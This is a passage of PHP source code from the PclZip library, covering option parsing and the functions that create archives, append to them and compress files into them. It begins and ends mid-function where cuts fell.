        $v_value = $p_options_list[$i+1];
        if ((!is_integer($v_value)) || ($v_value<0)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Integer expected for option '".PclZipUtilOptionText($p_options_list[$i])."'");
          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = $v_value*1048576;
        $i++;
      break;

      case PCLZIP_OPT_TEMP_FILE_ON :
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_OFF])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_OFF'");
          return PclZip::errorCode();
        }
        
        $v_result_list[$p_options_list[$i]] = true;
      break;

      case PCLZIP_OPT_TEMP_FILE_OFF :
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_ON])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_ON'");
          return PclZip::errorCode();
        }
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_THRESHOLD])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_THRESHOLD'");
          return PclZip::errorCode();
        }
        
        $v_result_list[$p_options_list[$i]] = true;
      break;

      case PCLZIP_OPT_EXTRACT_DIR_RESTRICTION :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        if (   is_string($p_options_list[$i+1])
            && ($p_options_list[$i+1] != '')) {
          $v_result_list[$p_options_list[$i]] = PclZipUtilTranslateWinPath($p_options_list[$i+1], FALSE);
          $i++;
        }
        else {
        }
      break;

      case PCLZIP_OPT_BY_NAME :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        if (is_string($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]][0] = $p_options_list[$i+1];
        }
        else if (is_array($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Wrong parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }
        $i++;
      break;

      case PCLZIP_OPT_BY_EREG :
        $p_options_list[$i] = PCLZIP_OPT_BY_PREG;
      case PCLZIP_OPT_BY_PREG :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        if (is_string($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Wrong parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }
        $i++;
      break;

      case PCLZIP_OPT_COMMENT :
      case PCLZIP_OPT_ADD_COMMENT :
      case PCLZIP_OPT_PREPEND_COMMENT :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE,
		                     "Missing parameter value for option '"
							 .PclZipUtilOptionText($p_options_list[$i])
							 ."'");

          return PclZip::errorCode();
        }

        if (is_string($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE,
		                     "Wrong parameter value for option '"
							 .PclZipUtilOptionText($p_options_list[$i])
							 ."'");

          return PclZip::errorCode();
        }
        $i++;
      break;

      case PCLZIP_OPT_BY_INDEX :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_work_list = array();
        if (is_string($p_options_list[$i+1])) {

            $p_options_list[$i+1] = strtr($p_options_list[$i+1], ' ', '');

            $v_work_list = explode(",", $p_options_list[$i+1]);
        }
        else if (is_integer($p_options_list[$i+1])) {
            $v_work_list[0] = $p_options_list[$i+1].'-'.$p_options_list[$i+1];
        }
        else if (is_array($p_options_list[$i+1])) {
            $v_work_list = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Value must be integer, string or array for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }
        
        $v_sort_flag=false;
        $v_sort_value=0;
        for ($j=0; $j<sizeof($v_work_list); $j++) {
            $v_item_list = explode("-", $v_work_list[$j]);
            $v_size_item_list = sizeof($v_item_list);
            
            
            if ($v_size_item_list == 1) {
                $v_result_list[$p_options_list[$i]][$j]['start'] = $v_item_list[0];
                $v_result_list[$p_options_list[$i]][$j]['end'] = $v_item_list[0];
            }
            elseif ($v_size_item_list == 2) {
                $v_result_list[$p_options_list[$i]][$j]['start'] = $v_item_list[0];
                $v_result_list[$p_options_list[$i]][$j]['end'] = $v_item_list[1];
            }
            else {
                PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Too many values in index range for option '".PclZipUtilOptionText($p_options_list[$i])."'");

                return PclZip::errorCode();
            }


            if ($v_result_list[$p_options_list[$i]][$j]['start'] < $v_sort_value) {
                $v_sort_flag=true;

                PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Invalid order of index range for option '".PclZipUtilOptionText($p_options_list[$i])."'");

                return PclZip::errorCode();
            }
            $v_sort_value = $v_result_list[$p_options_list[$i]][$j]['start'];
        }
        
        if ($v_sort_flag) {
        }

        $i++;
      break;

      case PCLZIP_OPT_REMOVE_ALL_PATH :
      case PCLZIP_OPT_EXTRACT_AS_STRING :
      case PCLZIP_OPT_NO_COMPRESSION :
      case PCLZIP_OPT_EXTRACT_IN_OUTPUT :
      case PCLZIP_OPT_REPLACE_NEWER :
      case PCLZIP_OPT_STOP_ON_ERROR :
        $v_result_list[$p_options_list[$i]] = true;
      break;

      case PCLZIP_OPT_SET_CHMOD :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        $i++;
      break;

      case PCLZIP_CB_PRE_EXTRACT :
      case PCLZIP_CB_POST_EXTRACT :
      case PCLZIP_CB_PRE_ADD :
      case PCLZIP_CB_POST_ADD :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_function_name = $p_options_list[$i+1];

        if (!function_exists($v_function_name)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Function '".$v_function_name."()' is not an existing function for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = $v_function_name;
        $i++;
      break;

      default :
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER,
	                       "Unknown parameter '"
						   .$p_options_list[$i]."'");

        return PclZip::errorCode();
    }

    $i++;
  }

  if ($v_requested_options !== false) {
    for ($key=reset($v_requested_options); $key=key($v_requested_options); $key=next($v_requested_options)) {
      if ($v_requested_options[$key] == 'mandatory') {
        if (!isset($v_result_list[$key])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Missing mandatory parameter ".PclZipUtilOptionText($key)."(".$key.")");

          return PclZip::errorCode();
        }
      }
    }
  }
  
  if (!isset($v_result_list[PCLZIP_OPT_TEMP_FILE_THRESHOLD])) {
    
  }

  return $v_result;
}

function privOptionDefaultThreshold(&$p_options)
{
  $v_result=1;
  
  if (isset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD])
      || isset($p_options[PCLZIP_OPT_TEMP_FILE_OFF])) {
    return $v_result;
  }
  
  $v_memory_limit = ini_get('memory_limit');
  $v_memory_limit = trim($v_memory_limit);
  $last = strtolower(substr($v_memory_limit, -1));

  if($last == 'g')
      $v_memory_limit = $v_memory_limit*1073741824;
  if($last == 'm')
      $v_memory_limit = $v_memory_limit*1048576;
  if($last == 'k')
      $v_memory_limit = $v_memory_limit*1024;
          
  $p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] = floor($v_memory_limit*PCLZIP_TEMPORARY_FILE_RATIO);
  

  if ($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] < 1048576) {
    unset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD]);
  }
        
  return $v_result;
}

function privFileDescrParseAtt(&$p_file_list, &$p_filedescr, $v_options, $v_requested_options=false)
{
  $v_result=1;
  
  foreach ($p_file_list as $v_key => $v_value) {
  
    if (!isset($v_requested_options[$v_key])) {
      PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid file attribute '".$v_key."' for this file");

      return PclZip::errorCode();
    }

    switch ($v_key) {
      case PCLZIP_ATT_FILE_NAME :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['filename'] = PclZipUtilPathReduction($v_value);
        
        if ($p_filedescr['filename'] == '') {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty filename for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

      break;

      case PCLZIP_ATT_FILE_NEW_SHORT_NAME :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['new_short_name'] = PclZipUtilPathReduction($v_value);

        if ($p_filedescr['new_short_name'] == '') {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty short filename for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }
      break;

      case PCLZIP_ATT_FILE_NEW_FULL_NAME :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['new_full_name'] = PclZipUtilPathReduction($v_value);

        if ($p_filedescr['new_full_name'] == '') {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty full filename for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }
      break;

      case PCLZIP_ATT_FILE_COMMENT :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['comment'] = $v_value;
      break;

      case PCLZIP_ATT_FILE_MTIME :
        if (!is_integer($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". Integer expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['mtime'] = $v_value;
      break;

      case PCLZIP_ATT_FILE_CONTENT :
        $p_filedescr['content'] = $v_value;
      break;

      default :
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER,
	                           "Unknown parameter '".$v_key."'");

        return PclZip::errorCode();
    }

    if ($v_requested_options !== false) {
      for ($key=reset($v_requested_options); $key=key($v_requested_options); $key=next($v_requested_options)) {
        if ($v_requested_options[$key] == 'mandatory') {
          if (!isset($p_file_list[$key])) {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Missing mandatory parameter ".PclZipUtilOptionText($key)."(".$key.")");
            return PclZip::errorCode();
          }
        }
      }
    }
  
  }
  
  return $v_result;
}

function privFileDescrExpand(&$p_filedescr_list, &$p_options)
{
  $v_result=1;
  
  $v_result_list = array();
  
  for ($i=0; $i<sizeof($p_filedescr_list); $i++) {
    
    $v_descr = $p_filedescr_list[$i];
    
    $v_descr['filename'] = PclZipUtilTranslateWinPath($v_descr['filename'], false);
    $v_descr['filename'] = PclZipUtilPathReduction($v_descr['filename']);
    
    if (file_exists($v_descr['filename'])) {
      if (@is_file($v_descr['filename'])) {
        $v_descr['type'] = 'file';
      }
      else if (@is_dir($v_descr['filename'])) {
        $v_descr['type'] = 'folder';
      }
      else if (@is_link($v_descr['filename'])) {
        continue;
      }
      else {
        continue;
      }
    }
    
    else if (isset($v_descr['content'])) {
      $v_descr['type'] = 'virtual_file';
    }
    
    else {
      PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "File '".$v_descr['filename']."' does not exist");

      return PclZip::errorCode();
    }
    
    $this->privCalculateStoredFilename($v_descr, $p_options);
    
    $v_result_list[sizeof($v_result_list)] = $v_descr;
    
    if ($v_descr['type'] == 'folder') {
      $v_dirlist_descr = array();
      $v_dirlist_nb = 0;
      if ($v_folder_handler = @opendir($v_descr['filename'])) {
        while (($v_item_handler = @readdir($v_folder_handler)) !== false) {

          if (($v_item_handler == '.') || ($v_item_handler == '..')) {
              continue;
          }
          
          $v_dirlist_descr[$v_dirlist_nb]['filename'] = $v_descr['filename'].'/'.$v_item_handler;
          
          if (($v_descr['stored_filename'] != $v_descr['filename'])
               && (!isset($p_options[PCLZIP_OPT_REMOVE_ALL_PATH]))) {
            if ($v_descr['stored_filename'] != '') {
              $v_dirlist_descr[$v_dirlist_nb]['new_full_name'] = $v_descr['stored_filename'].'/'.$v_item_handler;
            }
            else {
              $v_dirlist_descr[$v_dirlist_nb]['new_full_name'] = $v_item_handler;
            }
          }
    
          $v_dirlist_nb++;
        }
        
        @closedir($v_folder_handler);
      }
      else {
      }
      
      if ($v_dirlist_nb != 0) {
        if (($v_result = $this->privFileDescrExpand($v_dirlist_descr, $p_options)) != 1) {
          return $v_result;
        }
        
        $v_result_list = array_merge($v_result_list, $v_dirlist_descr);
      }
      else {
      }
        
      unset($v_dirlist_descr);
    }
  }
  
  $p_filedescr_list = $v_result_list;

  return $v_result;
}

function privCreate($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;
  $v_list_detail = array();
  
  $this->privDisableMagicQuotes();

  if (($v_result = $this->privOpenFd('wb')) != 1)
  {
    return $v_result;
  }

  $v_result = $this->privAddList($p_filedescr_list, $p_result_list, $p_options);

  $this->privCloseFd();

  $this->privSwapBackMagicQuotes();

  return $v_result;
}

function privAdd($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;
  $v_list_detail = array();

  if ((!is_file($this->zipname)) || (filesize($this->zipname) == 0))
  {

    $v_result = $this->privCreate($p_filedescr_list, $p_result_list, $p_options);

    return $v_result;
  }
  $this->privDisableMagicQuotes();

  if (($v_result=$this->privOpenFd('rb')) != 1)
  {
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    $this->privSwapBackMagicQuotes();
    return $v_result;
  }

  @rewind($this->zip_fd);

  $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';

  if (($v_zip_temp_fd = @fopen($v_zip_temp_name, 'wb')) == 0)
  {
    $this->privCloseFd();
    $this->privSwapBackMagicQuotes();

    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_zip_temp_name.'\' in binary write mode');

    return PclZip::errorCode();
  }

  $v_size = $v_central_dir['offset'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($this->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  $v_header_list = array();
  if (($v_result = $this->privAddFileList($p_filedescr_list, $v_header_list, $p_options)) != 1)
  {
    fclose($v_zip_temp_fd);
    $this->privCloseFd();
    @unlink($v_zip_temp_name);
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_offset = @ftell($this->zip_fd);

  $v_size = $v_central_dir['size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($v_zip_temp_fd, $v_read_size);
    @fwrite($this->zip_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  for ($i=0, $v_count=0; $i<sizeof($v_header_list); $i++)
  {
    if ($v_header_list[$i]['status'] == 'ok') {
      if (($v_result = $this->privWriteCentralFileHeader($v_header_list[$i])) != 1) {
        fclose($v_zip_temp_fd);
        $this->privCloseFd();
        @unlink($v_zip_temp_name);
        $this->privSwapBackMagicQuotes();

        return $v_result;
      }
      $v_count++;
    }

    $this->privConvertHeader2FileInfo($v_header_list[$i], $p_result_list[$i]);
  }

  $v_comment = $v_central_dir['comment'];
  if (isset($p_options[PCLZIP_OPT_COMMENT])) {
    $v_comment = $p_options[PCLZIP_OPT_COMMENT];
  }
  if (isset($p_options[PCLZIP_OPT_ADD_COMMENT])) {
    $v_comment = $v_comment.$p_options[PCLZIP_OPT_ADD_COMMENT];
  }
  if (isset($p_options[PCLZIP_OPT_PREPEND_COMMENT])) {
    $v_comment = $p_options[PCLZIP_OPT_PREPEND_COMMENT].$v_comment;
  }

  $v_size = @ftell($this->zip_fd)-$v_offset;

  if (($v_result = $this->privWriteCentralHeader($v_count+$v_central_dir['entries'], $v_size, $v_offset, $v_comment)) != 1)
  {
    unset($v_header_list);
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  $this->privCloseFd();

  @fclose($v_zip_temp_fd);

  $this->privSwapBackMagicQuotes();

  @unlink($this->zipname);

  PclZipUtilRename($v_zip_temp_name, $this->zipname);

  return $v_result;
}

function privOpenFd($p_mode)
{
  $v_result=1;

  if ($this->zip_fd != 0)
  {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Zip file \''.$this->zipname.'\' already open');

    return PclZip::errorCode();
  }

  if (($this->zip_fd = @fopen($this->zipname, $p_mode)) == 0)
  {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in '.$p_mode.' mode');

    return PclZip::errorCode();
  }

  return $v_result;
}

function privCloseFd()
{
  $v_result=1;

  if ($this->zip_fd != 0)
    @fclose($this->zip_fd);
  $this->zip_fd = 0;

  return $v_result;
}

function privAddList($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;

  $v_header_list = array();
  if (($v_result = $this->privAddFileList($p_filedescr_list, $v_header_list, $p_options)) != 1)
  {
    return $v_result;
  }

  $v_offset = @ftell($this->zip_fd);

  for ($i=0,$v_count=0; $i<sizeof($v_header_list); $i++)
  {
    if ($v_header_list[$i]['status'] == 'ok') {
      if (($v_result = $this->privWriteCentralFileHeader($v_header_list[$i])) != 1) {
        return $v_result;
      }
      $v_count++;
    }

    $this->privConvertHeader2FileInfo($v_header_list[$i], $p_result_list[$i]);
  }

  $v_comment = '';
  if (isset($p_options[PCLZIP_OPT_COMMENT])) {
    $v_comment = $p_options[PCLZIP_OPT_COMMENT];
  }

  $v_size = @ftell($this->zip_fd)-$v_offset;

  if (($v_result = $this->privWriteCentralHeader($v_count, $v_size, $v_offset, $v_comment)) != 1)
  {
    unset($v_header_list);

    return $v_result;
  }

  return $v_result;
}

function privAddFileList($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;
  $v_header = array();

  $v_nb = sizeof($p_result_list);

  for ($j=0; ($j<sizeof($p_filedescr_list)) && ($v_result==1); $j++) {
    $p_filedescr_list[$j]['filename']
    = PclZipUtilTranslateWinPath($p_filedescr_list[$j]['filename'], false);
    

    if ($p_filedescr_list[$j]['filename'] == "") {
      continue;
    }

    if (   ($p_filedescr_list[$j]['type'] != 'virtual_file')
        && (!file_exists($p_filedescr_list[$j]['filename']))) {
      PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "File '".$p_filedescr_list[$j]['filename']."' does not exist");
      return PclZip::errorCode();
    }

    if (   ($p_filedescr_list[$j]['type'] == 'file')
        || ($p_filedescr_list[$j]['type'] == 'virtual_file')
        || (   ($p_filedescr_list[$j]['type'] == 'folder')
            && (   !isset($p_options[PCLZIP_OPT_REMOVE_ALL_PATH])
                || !$p_options[PCLZIP_OPT_REMOVE_ALL_PATH]))
        ) {

      $v_result = $this->privAddFile($p_filedescr_list[$j], $v_header,
                                     $p_options);
      if ($v_result != 1) {
        return $v_result;
      }

      $p_result_list[$v_nb++] = $v_header;
    }
  }

  return $v_result;
}

function privAddFile($p_filedescr, &$p_header, &$p_options)
{
  $v_result=1;
  
  $p_filename = $p_filedescr['filename'];

  if ($p_filename == "") {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid file list parameter (invalid or empty list)");

    return PclZip::errorCode();
  }


  clearstatcache();
  $p_header['version'] = 20;
  $p_header['version_extracted'] = 10;
  $p_header['flag'] = 0;
  $p_header['compression'] = 0;
  $p_header['crc'] = 0;
  $p_header['compressed_size'] = 0;
  $p_header['filename_len'] = strlen($p_filename);
  $p_header['extra_len'] = 0;
  $p_header['disk'] = 0;
  $p_header['internal'] = 0;
  $p_header['offset'] = 0;
  $p_header['filename'] = $p_filename;
  $p_header['stored_filename'] = $p_filedescr['stored_filename'];
  $p_header['extra'] = '';
  $p_header['status'] = 'ok';
  $p_header['index'] = -1;

  if ($p_filedescr['type']=='file') {
    $p_header['external'] = 0x00000000;
    $p_header['size'] = filesize($p_filename);
  }
  
  else if ($p_filedescr['type']=='folder') {
    $p_header['external'] = 0x00000010;
    $p_header['mtime'] = filemtime($p_filename);
    $p_header['size'] = filesize($p_filename);
  }
  
  else if ($p_filedescr['type'] == 'virtual_file') {
    $p_header['external'] = 0x00000000;
    $p_header['size'] = strlen($p_filedescr['content']);
  }
  

  if (isset($p_filedescr['mtime'])) {
    $p_header['mtime'] = $p_filedescr['mtime'];
  }
  else if ($p_filedescr['type'] == 'virtual_file') {
    $p_header['mtime'] = time();
  }
  else {
    $p_header['mtime'] = filemtime($p_filename);
  }

  if (isset($p_filedescr['comment'])) {
    $p_header['comment_len'] = strlen($p_filedescr['comment']);
    $p_header['comment'] = $p_filedescr['comment'];
  }
  else {
    $p_header['comment_len'] = 0;
    $p_header['comment'] = '';
  }

  if (isset($p_options[PCLZIP_CB_PRE_ADD])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_header, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_ADD](PCLZIP_CB_PRE_ADD, $v_local_header);
    if ($v_result == 0) {
      $p_header['status'] = "skipped";
      $v_result = 1;
    }

    if ($p_header['stored_filename'] != $v_local_header['stored_filename']) {
      $p_header['stored_filename'] = PclZipUtilPathReduction($v_local_header['stored_filename']);
    }
  }

  if ($p_header['stored_filename'] == "") {
    $p_header['status'] = "filtered";
  }
  
  if (strlen($p_header['stored_filename']) > 0xFF) {
    $p_header['status'] = 'filename_too_long';
  }

  if ($p_header['status'] == 'ok') {

    if ($p_filedescr['type'] == 'file') {
      if ( (!isset($p_options[PCLZIP_OPT_TEMP_FILE_OFF])) 
          && (isset($p_options[PCLZIP_OPT_TEMP_FILE_ON])
              || (isset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD])
                  && ($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] <= $p_header['size'])) ) ) {
        $v_result = $this->privAddFileUsingTempFile($p_filedescr, $p_header, $p_options);
        if ($v_result < PCLZIP_ERR_NO_ERROR) {
          return $v_result;
        }
      }
      
      else {

      if (($v_file = @fopen($p_filename, "rb")) == 0) {
        PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, "Unable to open file '$p_filename' in binary read mode");
        return PclZip::errorCode();
      }

      $v_content = @fread($v_file, $p_header['size']);

      @fclose($v_file);

      $p_header['crc'] = @crc32($v_content);
      
      if ($p_options[PCLZIP_OPT_NO_COMPRESSION]) {
        $p_header['compressed_size'] = $p_header['size'];
        $p_header['compression'] = 0;
      }
      
      else {
        $v_content = @gzdeflate($v_content);

        $p_header['compressed_size'] = strlen($v_content);
        $p_header['compression'] = 8;
      }
      
      if (($v_result = $this->privWriteFileHeader($p_header)) != 1) {
        @fclose($v_file);
        return $v_result;
      }

      @fwrite($this->zip_fd, $v_content, $p_header['compressed_size']);

      }

    }

    else if ($p_filedescr['type'] == 'virtual_file') {
        
      $v_content = $p_filedescr['content'];

      $p_header['crc'] = @crc32($v_content);
      
      if ($p_options[PCLZIP_OPT_NO_COMPRESSION]) {
        $p_header['compressed_size'] = $p_header['size'];
        $p_header['compression'] = 0;
      }
      
      else {
        $v_content = @gzdeflate($v_content);

        $p_header['compressed_size'] = strlen($v_content);
        $p_header['compression'] = 8;
      }
      
      if (($v_result = $this->privWriteFileHeader($p_header)) != 1) {
        @fclose($v_file);
        return $v_result;
      }

      @fwrite($this->zip_fd, $v_content, $p_header['compressed_size']);
    }

    else if ($p_filedescr['type'] == 'folder') {
      if (@substr($p_header['stored_filename'], -1) != '/') {
        $p_header['stored_filename'] .= '/';
      }

      $p_header['size'] = 0;

      if (($v_result = $this->privWriteFileHeader($p_header)) != 1)
      {
        return $v_result;
      }
    }
  }

  if (isset($p_options[PCLZIP_CB_POST_ADD])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_header, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_POST_ADD](PCLZIP_CB_POST_ADD, $v_local_header);
    if ($v_result == 0) {
      $v_result = 1;
    }

  }

  return $v_result;
}

function privAddFileUsingTempFile($p_filedescr, &$p_header, &$p_options)
{
  $v_result=PCLZIP_ERR_NO_ERROR;
  
  $p_filename = $p_filedescr['filename'];


  if (($v_file = @fopen($p_filename, "rb")) == 0) {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, "Unable to open file '$p_filename' in binary read mode");
    return PclZip::errorCode();
  }

  $v_gzip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.gz';
  if (($v_file_compressed = @gzopen($v_gzip_temp_name, "wb")) == 0) {
    fclose($v_file);
    PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary write mode');
    return PclZip::errorCode();
  }

  $v_size = filesize($p_filename);
  while ($v_size != 0) {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($v_file, $v_read_size);
    @gzputs($v_file_compressed, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  @fclose($v_file);
  @gzclose($v_file_compressed);

  if (filesize($v_gzip_temp_name) < 18) {
    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'gzip temporary file \''.$v_gzip_temp_name.'\' has invalid filesize - should be minimum 18 bytes');
    return PclZip::errorCode();
  }

  if (($v_file_compressed = @fopen($v_gzip_temp_name, "rb")) == 0) {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary read mode');
    return PclZip::errorCode();
  }

  $v_binary_data = @fread($v_file_compressed, 10);
  $v_data_header = unpack('a1id1/a1id2/a1cm/a1flag/Vmtime/a1xfl/a1os', $v_binary_data);

  $v_data_header['os'] = bin2hex($v_data_header['os']);

  @fseek($v_file_compressed, filesize($v_gzip_temp_name)-8);
  $v_binary_data = @fread($v_file_compressed, 8);
  $v_data_footer = unpack('Vcrc/Vcompressed_size', $v_binary_data);

  $p_header['compression'] = ord($v_data_header['cm']);
  $p_header['crc'] = $v_data_footer['crc'];
  $p_header['compressed_size'] = filesize($v_gzip_temp_name)-18;

  @fclose($v_file_compressed);

  if (($v_result = $this->privWriteFileHeader($p_header)) != 1) {
    return $v_result;
  }

  if (($v_file_compressed = @fopen($v_gzip_temp_name, "rb")) == 0)
  {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary read mode');
    return PclZip::errorCode();
  }

  fseek($v_file_compressed, 10);
  $v_size = $p_header['compressed_size'];
  while ($v_size != 0)
  {
